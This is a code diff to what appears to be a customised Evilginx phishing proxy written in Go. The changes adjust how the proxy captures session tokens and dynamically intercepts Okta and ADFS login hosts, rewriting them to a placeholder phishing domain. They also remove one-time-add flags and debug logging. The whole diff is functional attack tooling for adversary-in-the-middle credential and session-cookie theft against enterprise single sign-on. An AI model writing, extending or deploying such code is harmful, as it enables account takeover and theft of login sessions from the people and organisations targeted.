@@ -46,8 +46,6 @@ const (
 	CONVERT_TO_PHISHING_URLS = 1
 )
 
-var addCookie = false
-
 const (
 	httpReadTimeout  = 45 * time.Second
 	httpWriteTimeout = 45 * time.Second
@@ -66,8 +64,6 @@ type HttpProxy struct {
 	bl                *Blacklist
 	sniListener       net.Listener
 	isRunning         bool
-	isAdded           bool
-	isAdded2          bool
 	sessions          map[string]*Session
 	sids              map[string]int
 	cookieName        string
@@ -669,7 +665,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.Proxy.OnResponse().
 		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
 			log.Important("ENTER PROXY.OnREPONSE")
-			log.Warning("request url: %s", ctx.Req.URL.String())
 			if resp == nil {
 				return nil
 			}
@@ -835,7 +830,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									is_auth = false
 								}
 								if is_auth {
-									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult()); err != nil {
+									if err := p.db.SetSessionTokens(ps.SessionId, s.Tokens); err != nil {
 										log.Error("database: %v", err)
 									}
 									s.IsDone = true
@@ -998,7 +993,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
-							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens, cfg.GetMailResult())
+							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
 							if err != nil {
 								log.Error("database: %v", err)
 							}
@@ -1591,70 +1586,51 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
 			u, err := url.Parse(s_url)
 
-			if strings.Contains(strings.ToLower(u.Host), ".okta.com") {
-				if p.isAdded == false {
-					log.Warning("ENTERED OKTA")
-					log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
-					parts := strings.Split(strings.ToLower(u.Host), ".")
-					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside body: %s", domain)
-					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside body: %s", subdomain)
+			if strings.Contains(strings.ToLower(u.Host), "okta.com") {
+				log.Warning("ENTERED OKTA")
+				log.Warning("URL ACCESS NOW : %s", strings.ToLower(u.Host))
+				parts := strings.Split(strings.ToLower(u.Host), ".")
+				domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+				log.Warning("domain inside body: %s", domain)
+				subdomain := parts[len(parts)-3]
+				log.Warning("subdomain inside body: %s", subdomain)
 
-					data := ProxyHost{
-						phish_subdomain: subdomain,
-						domain:          domain,
-						orig_subdomain:  subdomain,
-						is_landing:      false,
-						handle_session:  true,
-						auto_filter:     true,
-					}
-					log.Warning("data: %s", data)
-					pl.proxyHosts = append(pl.proxyHosts, data)
-					hosts = append(hosts, combineHost(subdomain, domain))
-					sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
-					p.isAdded = true
+				data := ProxyHost{
+					phish_subdomain: subdomain,
+					domain:          domain,
+					orig_subdomain:  subdomain,
+					is_landing:      false,
+					handle_session:  true,
+					auto_filter:     false,
 				}
+				log.Warning("data: %s", data)
+				pl.proxyHosts = append(pl.proxyHosts, data)
+				hosts = append(hosts, combineHost(subdomain, domain))
+				sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
 
 			}
 
 			if strings.Contains(strings.ToLower(u.Host), "adfs") {
-				if p.isAdded2 == false {
-					parts := strings.Split(strings.ToLower(u.Host), ".")
-					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
-					log.Warning("domain inside body: %s", domain)
-					subdomain := parts[len(parts)-3]
-					log.Warning("subdomain inside body: %s", subdomain)
+				parts := strings.Split(strings.ToLower(u.Host), ".")
+				domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
+				log.Warning("domain inside body: %s", domain)
+				subdomain := parts[len(parts)-3]
+				log.Warning("subdomain inside body: %s", subdomain)
 
-					data := ProxyHost{
-						phish_subdomain: subdomain,
-						domain:          domain,
-						orig_subdomain:  subdomain,
-						is_landing:      false,
-						handle_session:  true,
-						auto_filter:     false,
-					}
-					log.Warning("data: %s", data)
-					pl.proxyHosts = append(pl.proxyHosts, data)
-					hosts = append(hosts, combineHost(subdomain, domain))
-					sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
-					p.isAdded2 = true
+				data := ProxyHost{
+					phish_subdomain: subdomain,
+					domain:          domain,
+					orig_subdomain:  subdomain,
+					is_landing:      false,
+					handle_session:  true,
+					auto_filter:     false,
 				}
+				log.Warning("data: %s", data)
+				pl.proxyHosts = append(pl.proxyHosts, data)
+				hosts = append(hosts, combineHost(subdomain, domain))
+				sub_map[combineHost(subdomain, domain)] = subdomain + ".fuck.com"
 
 			}
-
-			log.Warning("ENTERED PATCHURLS")
-			log.Warning("s_url: %s", strings.ToLower(u.Host))
-			log.Warning("PHISHLETS site : %s", pl.Site)
-			log.Warning("PHISHLETS name : %s", pl.Name)
-			log.Warning("PHISHLETS ProxyHost : %s", pl.proxyHosts)
-			log.Warning("PHISHLETS DOMAIN : %s", pl.domains)
-			//log.Warning("PHISHLETS ProxyHosts : %s", pl.proxyHosts)
-
-			//err = json.Unmarshal(pl, &pl)
-			//if err != nil {
-			//	return ""
-			//}
 
 			sort.Slice(hosts, func(i, j int) bool {
 				return len(hosts[i]) > len(hosts[j])
@@ -1783,8 +1759,6 @@ func (p *HttpProxy) httpsWorker() {
 	log.Important("EVILGINX STARTED")
 	log.Important("starting https proxy on %s:%d", p.cfg.activeHostnames, p.cfg.proxyPort)
 	p.isRunning = true
-	p.isAdded = false
-	p.isAdded2 = false
 	log.Warning("IsRunning: %v", p.isRunning)
 	for p.isRunning {
 		log.Warning("IsRunning: %v", p.isRunning)
@@ -1921,7 +1895,6 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 
 					return prefix + combineHost(ph.orig_subdomain, ph.domain), true
 				} else {
-					log.Warning("replaceHostWithOriginal ELSE: %s", hostname)
 					//if subdomain == "pointb" {
 					//if !adding {
 					//	log.Warning("ADDING PROXY HOST IN replaceHostWithOriginal")
